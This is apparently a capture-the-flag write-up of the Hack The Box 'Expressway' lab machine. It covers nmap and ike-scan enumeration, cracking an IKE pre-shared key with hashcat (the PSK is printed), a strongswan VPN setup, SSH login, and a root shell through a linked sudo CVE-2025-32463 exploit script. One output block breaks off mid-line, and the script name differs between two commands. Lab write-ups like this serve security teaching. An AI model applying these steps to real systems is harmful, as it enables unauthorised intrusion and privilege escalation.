---
name: Expressway
difficulty: easy
os: linux
platform: htb
date: 2025/09/21
releasedDate: 2099-12-31
userFlag: true
rootFlag: true

img: https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/75c168f01f04e5f256838733b77f13ec.png
---

## Enumeration

We start by scanning the target machine for open ports using Nmap. We will use the `-p-` option to scan all ports and the `--open` option to filter out closed ports:
```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.10.11.87 -oN allPorts
```
```
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
```


Now we will scan the open ports with service version detection and script scanning using `-sC` and `-sV` options

```bash
nmap -p22 -sCV 10.10.11.87 -oN targeted
```
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 10.0p2 Debian 8 (protocol 2.0)
```

It seems that there is only SSH port open on TCP. It's version it is quite recent, so we will try enumerating UDP.

We scan the target machine for open UDP ports using Nmap. We will use the `-sU` option to scan UDP ports :
```bash
sudo nmap -p- -sU --min-rate 5000 -vvv -Pn -n 10.10.11.87 -oN allPortsUDP
```
```
PORT    STATE SERVICE
500/udp open  isakmp
```

We use `ike-scan` to enumerate the IKE service on UDP port 500:
```bash
sudo ike-scan -A 10.10.11.87
```
```
Starting ike-scan 1.9.6 with 1 hosts (http://www.nta-monitor.com/tools/ike-scan/)
10.10.11.87	Aggressive Mode Handshake returned 
    HDR=(CKY-R=74ed959da9a03d23) 
    SA=(
        Enc=3DES 
        Hash=SHA1 
        Group=2:modp1024 
        Auth=PSK 
        LifeType=Seconds 
        LifeDuration=28800
    ) 
    KeyExchange(128 bytes) 
    Nonce(32 bytes) 
    ID(Type=ID_USER_FQDN, 
    Value=ike@expressway.htb) 
    VID=09002689dfd6b712 
    (XAUTH) 
    VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0) 
    Hash(20 bytes)

Ending ike-scan 1.9.6: 1 hosts scanned in 0.053 seconds (18.91 hosts/sec).  1 returned handshake; 0 returned notify
```

We find out the server is using Aggressive Mode with PSK authentication. We also get `ike` which looks like a system user.

We use `-P` option to output the aggressive mode pre-shared key (PSK) parameters for offline cracking  using  the  `psk-crack`  program  that is supplied with ike-scan.
```bash
sudo ike-scan -Ppsk.txt -A 10.10.11.87
```

The output is saved in `psk.txt` file and can be cracked using `psk-crack` or `hashcat` and a wordlist like `rockyou.txt`:
```bash
hashcat -m 5400 psk.txt /usr/share/wordlists/rockyou.txt
```

This will give us the PSK `freakingrockstarontheroad`.

Next, we will connect to the VPN using `strongswan`. First, we need to create a configuration file `/etc/ipsec.conf`:
```bash
config setup
    charondebug="ike 2, knl 2, cfg 2"
    uniqueids=no

conn ikev1
    keyexchange=ikev1
    authby=psk
    ike=aes256-sha1-modp1024!
    esp=aes256-sha1!
    left=%defaultroute
    leftid=ike@expressway.htb
    right=10.10.11.87
    rightid=ike@expressway.htb
    rightsubnet=0.0.0.0/0
    auto=start
```

We also need to add the PSK to `/etc/ipsec.secrets`:
```bash
ike@expressway.htb : PSK "freakingrockstarontheroad"
```
We can now start the VPN connection using `ipsec`:
```bash
sudo ipsec restart
sudo ipsec up ikev1
```
```
initiating IKE_SA ikev1[1] to 10.10.11.87
generating IKE_AUTH request 1 [ IDi N(INITIAL_CONTACT) N(AUTH) N(ADDR) N(MOBIKE_SUP) ]
sending packet: from
<your_ip_address>[500] to

We can now try connecting via SSH using the `ike` user and the PSK as password:
```bash
ssh ike@10.10.11.87
whoami
```
```
ike
```

We have successfully logged in as the `ike` user. Now we can check the home directory for the user flag:
```bash
cat /home/ike/user.txt
```
```
user flag value
```


## Root Exploitation

We check the `sudo` version:
```bash
sudo -V
```
```
Sudo version 1.9.17
```

We look for possible vulnerabilities in this version online and find CVE-2025-32463.

We copy the exploit from https://github.com/pr0v3rbs/CVE-2025-32463_chwoot/

We run the exploit to get a root shell:
```bash
chmod +x sudo_chwoot.sh
./sudo.chwoot.sh
```
```
woot!
```

Now, we have a root shell:
```bash
whoami
cat /root/root.txt
```
```
root
root flag value
```

## Conclusion

We have successfully exploited the Expressway machine and obtained both user and root flags. The key steps involved enumerating the IKE service, cracking the PSK, connecting via VPN, and exploiting a sudo vulnerability to gain root access. 
